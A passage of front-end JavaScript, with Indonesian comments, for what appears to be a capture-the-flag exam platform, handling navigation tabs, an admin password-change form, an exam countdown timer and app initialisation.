  }
}

/* ================= EVENT HANDLERS & INIT ================= */
document.querySelectorAll('.binder-tab').forEach(b=>{
  b.onclick=()=>{
    stopAudio();
    if(b.dataset.view==='admin' && !adminToken){
      view='superadminLogin';
    } else {
      view=b.dataset.view;
    }
    render();
  };
});

if($('#btnHeaderAuth')){
  $('#btnHeaderAuth').onclick=()=>{
    stopAudio();
    authSubTab='login';
    view='auth';
    render();
  };
}

if($('#logout')){
  $('#logout').onclick=performLogout;
}

if($('#closeChangePassDialog')){
  $('#closeChangePassDialog').onclick = () => {
    $('#changePasswordDialog')?.close();
  };
}

// Handler Formulir Ganti Kata Sandi Administrator
const changePassForm = $('#changePasswordForm');
if(changePassForm){
  changePassForm.onsubmit = async e => {
    e.preventDefault();
    const errSlot = $('#changePassError');
    if(errSlot) errSlot.textContent = '';
    try {
      const cur = $('#currentAdminPassword').value;
      const neu = $('#newAdminPassword').value;
      const conf = $('#confirmAdminPassword').value;

      if(neu !== conf){
        throw Error('Konfirmasi kata sandi baru tidak sesuai!');
      }

      const res = await api('/api/admin/change-password', 'POST', {
        currentPassword: cur,
        newPassword: neu
      });

      adminToken = res.token;
      sessionStorage.setItem('cyber_admin_token', adminToken);
      alert('✓ Kata sandi administrator berhasil diperbarui!');
      $('#changePasswordDialog')?.close();
      changePassForm.reset();
    } catch(err) {
      if(errSlot) errSlot.textContent = err.message;
    }
  };
}

async function checkExamTimer(){
  try{
    const st=await fetch('/api/exam-status').then(r=>r.json());
    const badge=$('#examTimerBadge');
    const cd=$('#timerCountdown');
    if(!badge || !cd) return;

    if(st.examMode && st.examEndTime){
      badge.style.display='inline-flex';
      if(st.isExpired){
        badge.className='exam-timer-badge ended';
        cd.textContent='WAKTU TELAH HABIS';
        const submitBtn=$('#btnSubmitFlag');
        if(submitBtn){
          submitBtn.disabled=true;
          submitBtn.textContent='🔒 Waktu Ujian Telah Berakhir';
        }
      }else{
        const rem=st.remainingSeconds||0;
        const mins=Math.floor(rem/60);
        const secs=rem%60;
        cd.textContent=`${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
        if(rem<300){
          badge.className='exam-timer-badge';
        }else{
          badge.className='exam-timer-badge warning';
        }
      }
    }else{
      badge.style.display='none';
    }
  }catch{}
}

setInterval(checkExamTimer, 1000);
checkExamTimer();
updateDbStatusPill();

function checkRoute(){
  const path=window.location.pathname.toLowerCase();
  const hash=window.location.hash.toLowerCase();
  const isSuperAdmin=(path==='/superadmin' || path.startsWith('/superadmin/') || hash==='#/superadmin');
  const adminTab=$('#binderTabAdmin');

  if(isSuperAdmin){
    if(adminTab) adminTab.style.display='inline-flex';
    view = adminToken ? 'admin' : 'superadminLogin';
  } else {
    if(adminTab && !adminToken) adminTab.style.display='none';
    else if(adminTab && adminToken) adminTab.style.display='inline-flex';
    if(view==='superadminLogin') view='dashboard';
  }
}

window.addEventListener('hashchange', ()=>{
  checkRoute();
  render();
});

// Inisialisasi Aplikasi: Tidak ada dialog popup yang mengganggu, halaman bersih dan tenang
async function initApp(){
  checkRoute();

  try{
    const pub = await fetch('/api/public/challenges').then(r=>r.json()).catch(()=>null);
    if(pub && Array.isArray(pub.challenges) && pub.challenges.length>0){
      challenges = pub.challenges;
      if(!challenges.some(c=>c.id===selected)){
        selected = challenges[0].id;
      }
    }
  }catch(e){}

  if(token && name){
    try{
      await refresh();
    }catch(err){
      render();
    }
  }else{
    render();
  }
}

initApp();
